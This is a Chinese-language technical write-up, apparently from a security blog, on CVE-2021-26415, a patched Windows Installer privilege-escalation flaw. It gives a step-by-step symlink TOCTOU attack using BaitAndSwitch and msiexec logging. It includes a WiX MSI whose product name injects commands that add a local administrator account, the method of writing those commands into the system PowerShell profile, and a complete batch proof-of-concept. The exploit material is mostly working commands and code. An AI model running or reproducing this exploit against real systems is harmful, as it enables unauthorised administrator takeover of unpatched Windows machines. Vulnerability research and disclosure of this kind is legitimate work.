@@ -1,0 +1,297 @@
+CVE ID| [CVE-2021-26415](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26415)  
+---|---  
+CVSS评分| 7.3,
+[(AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H)](http://nvd.nist.gov/cvss.cfm?calculator&version=3.0&vector=\(AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H\))  
+受影响的供应商| [微软](https://www.microsoft.com/)  
+受影响的产品| Windows  
+漏洞详情| 此漏洞使本地攻击者可以将数据写入受影响的Microsoft
+Windows安装上的任意文件。攻击者必须首先获得在目标系统上执行低特权代码的能力，以利用此漏洞。Windows
+Installer服务中存在特定缺陷。造成此问题的原因是，在文件操作中使用用户提供的路径之前，没有对其进行正确的验证。攻击者可以利用此漏洞来升级特权，并在管理员的上下文中执行任意代码。  
+额外细节| Microsoft已发布更新来纠正此漏洞。可以在以下位置找到更多详细信息：[msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26415](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26415)  
+披露时间表| 2020-12-16-向供应商报告了漏洞  
+2021-04-15-协调公开发布的咨询  
+  
+ ***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+这是一个影响Windows
+Installer组件的本地特权升级（LPE）漏洞。它基于TOCTOU和使用符号链接的文件系统攻击。该问题导致写入具有LocalSystem特权和对内容的部分控制的任意文件。我找不到能完全控制内容的向量（以替换DLL文件内容等），但即使是部分控制也足以将任意PowerShell命令注入默认配置文件，并在管理员帐户或计划好的时间提升特权任务运行PowerShell控制台。
+
+我将Windows 10和2019 Server的问题报告为 **0day**
+，但根据通报，该问题也影响其他系统：8.1、7、2012、2016、2008。古代系统也可能易受攻击。
+
+## 技术细节
+
+### Windows安装程序
+
+该`msiexec`系统二进制用于安装从MSI格式（Windows安装程序包）应用程序。它不仅是PE文件的别称，而且格式稍微复杂一些。的典型用法`msiexec`要求具有管理权限，但是也有例外。例如，该`/f`开关可由非特权用户用来执行修复操作。此操作通常可以在没有任何管理员权限的情况下执行。过去，此开关已用于多种LPE攻击中-易受攻击的组件通常是MSI程序包本身。通常，要查找此类MSI，我只需转到`C:\Windows\Installer`目录并从那里开始。这次，我们将仅选择一个现有文件并将其用于攻击操作系统本身。二手的安装程序（148d3c4.msi）是我在系统上发现的一些随机DropBox
+MSI。
+
+[![](https://image.3001.net/images/20210427/1619515515_6087d87bc551fff45f7f8.png!small)](https://image.3001.net/images/20210427/1619515515_6087d87bc551fff45f7f8.png!small)
+
+如果`/L`提供了选件，则可以通过记录来扩展修复操作。该`msiexec`会记录一些信息到一个尖端的文件。让我们使用procmon来查看普通用户执行以下命令会发生什么情况：
+
+    
+    
+    msiexec /f C:\Windows\Installer\148d3c4.msi /L C:\temp\foo.log
+    
+
+[![](https://image.3001.net/images/20210427/1619515516_6087d87cab9ec56d8fa98.png!small)](https://image.3001.net/images/20210427/1619515516_6087d87cab9ec56d8fa98.png!small)
+
+在上图中，您可以看到已配置的过滤器和突出显示。这有助于从视觉上区分在系统完整性级别上运行但模拟普通用户和使用全部功能的用户之间的操作。例如，对指向文件的初始CreateFile操作使用模拟。该过程不会打开我们无法访问的任何内容。我们不能仅仅指向其他文件（例如`C:\Windows\win.ini`）并依靠提升的访问权限。它不会起作用，从LPE的角度来看，这没什么有趣的。
+
+在下面的几行中，再次使用完整的LocalSystem令牌再次处理文件，但这一次。也许只有对文件的初始访问受到保护？我们可以使用符号链接进行测试。
+
+### 符号链接攻击
+
+我不会详细介绍符号链接，如果您不熟悉此概念，请查看[有关Windows特权文件操作滥用的](https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html)出色[介绍](https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html)。
+
+在[詹姆斯·福肖的符号链接工具包](https://github.com/googleprojectzero/symboliclink-testing-tools)是一个事实上的标准，利用等问题。特别是，`BaitAndSwitch.exe`应用程序会执行此处所需的所有操作-捕获[oplock中](https://docs.microsoft.com/en-us/windows/win32/fileio/opportunistic-locks)的初始文件检查，然后将链接从原始文件更改为其他位置-目标文件。初始权限检查会验证对安全文件的访问，但是接下来将对另一个文件（现在由相同的符号链接指向）执行读/写操作。这是典型的TOCTOU问题。在这种情况下使用的那种符号链接不需要任何特殊的访问权限-任何无特权的用户都可以创建一个。
+
+让我们执行以下命令：
+
+    
+    
+    BaitAndSwitch.exe C:\temp\linkdir\link C:\temp\foo.log C:\foo.log
+    msiexec /f C:\Windows\Installer\148d3c4.msi /L C:\temp\linkdir\link
+
+[![](https://image.3001.net/images/20210427/1619515517_6087d87da42c554c338c9.png!small)](https://image.3001.net/images/20210427/1619515517_6087d87da42c554c338c9.png!small)
+
+这是初始文件访问，物料清单（BOM）字符是从中等完整性线程写入的-它还会验证对文件的访问权限。确认后，将触发BaitAndSwitch并更改指向的位置。
+
+[![](https://image.3001.net/images/20210427/1619515519_6087d87f064b91c04e641.png!small)](https://image.3001.net/images/20210427/1619515519_6087d87f064b91c04e641.png!small)
+
+你看到了吗？符号链接已经切换到新的目标（`C:\foo.log`），并且在模拟下进行了一堆操作之后，就从LocalSystem创建了一个CreateFile。再进行几次操作后，文件将关闭并最终保存在磁盘上。
+
+[![](https://image.3001.net/images/20210427/1619515519_6087d87fc051e4084ac28.png!small)](https://image.3001.net/images/20210427/1619515519_6087d87fc051e4084ac28.png!small)
+
+该文件遵循现有的访问权限规则-没有提供额外的权限，但是我们只是证明了任意写入。里面有什么？
+
+    
+    
+    MSI (s) (AC:34) [16:14:11:665]: Product: Dropbox Update Helper -- Configuration completed successfully.
+    
+    MSI (s) (AC:34) [16:14:11:665]: Windows Installer reconfigured the product. Product Name: Dropbox Update Helper. Product Version: 1.3.415.1. Product Language: 1033. Manufacturer: Dropbox, Inc.. Reconfiguration success or error status: 0.
+
+嗯 真没用。我们可能会覆盖重要文件，但不会直接提升特权。我们将不得不为此而努力。
+
+### 部分内容控制
+
+此时，我开始检查所返回的标志`msiexec /h`。也许有可能获得对书面数据的全部或至少部分控制权？
+
+日志记录选项参数中有一些不错的候选者：
+
+/fp添加了终端属性，其中一些绝对由我控制，因为它们来自用户可写的注册表配置单元或环境变量。例如，看怎么注入; notepad.exe
+;到%APPDATA%变量。
+
+    
+    
+    === Logging started: 4/15/2021  20:18:09 ===
+    Property(S): UpdateDir = C:\Program Files (x86)\Dropbox\Update\
+    Property(S): DropboxProgramDir = C:\Program Files (x86)\Dropbox\
+    Property(S): ProgramFilesFolder = C:\Program Files (x86)\
+    Property(S): TARGETDIR = C:\
+    Property(S): ALLUSERS = 1
+    Property(S): ARPSYSTEMCOMPONENT = 1
+    Property(S): DISABLEROLLBACK = 1
+    Property(S): Manufacturer = Dropbox, Inc.
+    Property(S): ProductCode = {099218A5-A723-43DC-8DB5-6173656A1E94}
+    Property(S): ProductLanguage = 1033
+    Property(S): ProductName = Dropbox Update Helper
+    Property(S): ProductVersion = 1.3.415.1
+    Property(S): UpgradeCode = {C7A2CC6E-044B-4A2C-BD1E-E75EAD2C11B0}
+    Property(S): MsiLogFileLocation = C:\temp\log.txt
+    Property(S): PackageCode = {E42CA6BD-944C-4847-A481-D150906EC78E}
+    Property(S): ProductState = 5
+    Property(S): ProductToBeRegistered = 1
+    Property(S): RestrictedUserControl = 1
+    Property(S): REINSTALL = ALL
+    Property(S): REINSTALLMODE = pecms
+    Property(S): CURRENTDIRECTORY = C:\Users\lowpriv
+    Property(S): CLIENTUILEVEL = 2
+    Property(S): CLIENTPROCESSID = 12412
+    Property(S): MsiSystemRebootPending = 1
+    Property(S): PRODUCTLANGUAGE = 1033
+    Property(S): VersionDatabase = 300
+    Property(S): VersionMsi = 5.00
+    Property(S): VersionNT = 603
+    Property(S): VersionNT64 = 603
+    Property(S): WindowsBuild = 9600
+    Property(S): ServicePackLevel = 0
+    Property(S): ServicePackLevelMinor = 0
+    Property(S): MsiNTProductType = 1
+    Property(S): WindowsFolder = C:\WINDOWS\
+    Property(S): WindowsVolume = C:\
+    Property(S): System64Folder = C:\WINDOWS\system32\
+    Property(S): SystemFolder = C:\WINDOWS\SysWOW64\
+    Property(S): RemoteAdminTS = 1
+    Property(S): TempFolder = C:\Users\lowpriv\AppData\Local\Temp\
+    Property(S): CommonFilesFolder = C:\Program Files (x86)\Common Files\
+    Property(S): ProgramFiles64Folder = C:\Program Files\
+    Property(S): CommonFiles64Folder = C:\Program Files\Common Files\
+    Property(S): AppDataFolder = C:\Users\lowpriv\AppData\Roaming ; notepad.exe ;\
+    Property(S): FavoritesFolder = C:\Users\lowpriv\Favorites\
+    Property(S): NetHoodFolder = C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\Network Shortcuts\
+    Property(S): PersonalFolder = C:\Users\lowpriv\Documents\
+    Property(S): PrintHoodFolder = C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\Printer Shortcuts\
+    Property(S): RecentFolder = C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\Recent\
+    Property(S): SendToFolder = C:\Users\lowpriv\AppData\Roaming\Microsoft\Windows\SendTo\
+    Property(S): TemplateFolder = C:\ProgramData\Microsoft\Windows\Templates\
+    Property(S): CommonAppDataFolder = C:\ProgramData\
+    Property(S): LocalAppDataFolder = C:\Users\lowpriv\AppData\Local\
+    Property(S): MyPicturesFolder = C:\Users\lowpriv\Pictures\
+    Property(S): AdminToolsFolder = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Administrative Tools\
+    Property(S): StartupFolder = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
+    Property(S): ProgramMenuFolder = C:\ProgramData\Microsoft\Windows\Start Menu\Programs\
+    Property(S): StartMenuFolder = C:\ProgramData\Microsoft\Windows\Start Menu\
+    Property(S): DesktopFolder = C:\Users\Public\Desktop\
+    Property(S): FontsFolder = C:\WINDOWS\Fonts\
+    Property(S): GPTSupport = 1
+    Property(S): OLEAdvtSupport = 1
+    Property(S): ShellAdvtSupport = 1
+    Property(S): MsiAMD64 = 6
+    Property(S): Msix64 = 6
+    Property(S): Intel = 6
+    Property(S): PhysicalMemory = 5687
+    Property(S): VirtualMemory = 2713
+    Property(S): LogonUser = lowpriv
+    Property(S): UserSID = S-1-5-21-2746136434-3241333796-1554539884-1002
+    Property(S): UserLanguageID = 1033
+    Property(S): ComputerName = DESKTOP-OMNIO40
+    Property(S): SystemLanguageID = 1033
+    Property(S): ScreenX = 1024
+    Property(S): ScreenY = 768
+    Property(S): CaptionHeight = 19
+    Property(S): BorderTop = 1
+    Property(S): BorderSide = 1
+    Property(S): TextHeight = 16
+    Property(S): TextInternalLeading = 3
+    Property(S): ColorBits = 32
+    Property(S): TTCSupport = 1
+    Property(S): Time = 20:18:09
+    Property(S): Date = 4/15/2021
+    Property(S): MsiNetAssemblySupport = 4.8.4084.0
+    Property(S): MsiWin32AssemblySupport = 6.3.19041.1
+    Property(S): RedirectedDllSupport = 2
+    Property(S): AdminUser = 1
+    Property(S): MsiRunningElevated = 1
+    Property(S): Privileged = 1
+    Property(S): USERNAME = Adrian
+    Property(S): Installed = 00:00:00
+    Property(S): DATABASE = C:\WINDOWS\Installer\148d3c4.msi
+    Property(S): OriginalDatabase = C:\WINDOWS\Installer\148d3c4.msi
+    Property(S): RollbackDisabled = 1
+    Property(S): UILevel = 3
+    Property(S): Preselected = 1
+    Property(S): ACTION = INSTALL
+    Property(S): ROOTDRIVE = C:\
+    Property(S): CostingComplete = 1
+    Property(S): OutOfDiskSpace = 0
+    Property(S): OutOfNoRbDiskSpace = 0
+    Property(S): PrimaryVolumeSpaceAvailable = 0
+    Property(S): PrimaryVolumeSpaceRequired = 0
+    Property(S): PrimaryVolumeSpaceRemaining = 0
+    Property(S): INSTALLLEVEL = 1
+    === Logging stopped: 4/15/2021  20:18:09 ===
+
+如果您不明白为什么这样做可能有用，我将在第二秒中进行解释。现在，输出中有很多垃圾。让我们再努力一点。
+
+`/L+`
+
+将追加而不是覆盖-这在某些情况下可能很有用，并且使我们能够在不破坏整个文件的情况下测试攻击。
+
+`/Lc`
+
+仅记录初始UI参数。这仅导致两行输出，但不受攻击者控制。
+
+    
+    
+    === Logging started: 4/15/2021  20:28:50 ===
+    === Logging stopped: 4/15/2021  20:28:50 ===
+
+其他日志记录标志没有太大帮助，另外它们甚至导致MSI使用多个线程，并且可能导致其他问题。有些会记录冗长的消息，有些只会记录错误……也许恶意的MSI软件包对内容有更多的控制权？听起来是个好主意。让我们准备一个自定义的。
+
+### 制作MSI
+
+可以使用[WiX工具集](https://wixtoolset.org/releases/)制作自定义MSI软件包。这样，我们将控制行为以及MSI包的其他属性。
+
+首先，我们需要创建具有以下内容的example.wxs文件：
+
+    
+    
+    <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+       <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" 
+    
+                Name="; net user FooBar P@ssw0rd /add ; net localgroup Administrators FooBar /add #" Version="0.0.1" Manufacturer="Example Company Name" Language="1033">
+          <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+          <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+    
+          <Directory Id="TARGETDIR" Name="SourceDir">
+             <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"/>
+          </Directory>
+    
+          <Feature Id="DefaultFeature" Level="1">
+             <ComponentRef Id="ApplicationFiles"/>
+          </Feature>
+       </Product>
+    </Wix>
+
+注意名称属性。它包含注入的PowerShell命令以及“;” 分开说明。末尾的“＃”用于注释掉该行中的其余字符。稍后将更加清楚。
+
+现在，我们可以使用`candle.exe example.wxs`来处理上面的定义并`light
+example.wixobj`创建example.msi包。
+
+让我们将其移至受攻击的系统并重做攻击：
+
+    
+    
+    msiexec /f C:\temp\example.msi /L C:\Temp\log.txt
+
+[![](https://image.3001.net/images/20210427/1619515520_6087d88082512668f3d29.png!small)](https://image.3001.net/images/20210427/1619515520_6087d88082512668f3d29.png!small)
+
+  
+
+哎呀。这行不通-我们需要先安装软件包，这显然需要管理员权限。让我们甚至不从社会工程叙事开始。这是一个死胡同。
+
+### 产品广告
+
+我决定测试其他标志-也许修复不是触发的唯一有趣选择。该`/j<u|m> <Product.msi>`选项用作将产品-m推广给所有用户，u推广给当前用户。让我们看看它的真正作用：
+
+    
+    
+    BaitAndSwitch C:\temp\linkdir\link C:\temp\fakelog.txt C:\foo.log
+    msiexec /j example.msi /L C:\temp\linkdir\link
+
+[![](https://image.3001.net/images/20210427/1619515521_6087d8812413ce784f626.png!small)](https://image.3001.net/images/20210427/1619515521_6087d8812413ce784f626.png!small)
+
+UAC提示。因此，毕竟它必须仅是admin …但是，如果我们看一下procmon-看起来已经发生写操作。
+
+我们根本不需要提供任何凭证！在这一点上，我们可以安全地取消UAC-高架书写已经发生！攻击者控制的数据将附加到目标文件，并且我们可以执行带有部分内容控制的任意写入。
+
+### 最后的润色
+
+该`C:\foo.log`文件现在包含：
+
+    
+    
+    MSI (s) (58:68) [21:20:31:191]: Product: ; net user FooBar P@ssw0rd /add ; net localgroup Administrators FooBar /add # -- Advertisement failed.
+
+我是否提到过这是UTF-16文件？好吧，是的。因此它不能转换为`cmd.exe`有效负载，但是PowerShell会很乐意处理该文件。分号用于拆分命令，并使用哈希字符注释掉其余文本。
+
+如果您覆盖（或创建新的）`C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1`，则下次管理员启动PowerShell时将开始该操作。在其他LPE位置也很合适，但是考虑其他向量将是您的家庭作业。
+
+我要解决的另一个问题是完全摆脱UAC提示。为此，使用了另一个开关：`/t somevalue
+/qn`-这将在写入之后但在UAC提示之前触发一个静默错误。我们有意希望安装程序在早期阶段失败。该`/qn`开关将保证没有UI。即使没有GUI访问系统，也可以使有效负载可用，并且没有任何东西阻止控制台交互。
+
+## 完整的PoC
+
+讲完所有故事之后，最终的PoC是：
+
+    
+    
+    @echo off
+    REM Put BaitAndSwitch, example.msi into C:\temp
+    echo > C:\temp\fakelog.txt
+    start C:\temp\BaitAndSwitch C:\temp\linkdir\link C:\temp\fakelog.txt C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1
+    timeout /t 1
+    msiexec /j C:\temp\example.msi /t ksz /Li! C:\temp\linkdir\link /qn﻿
+
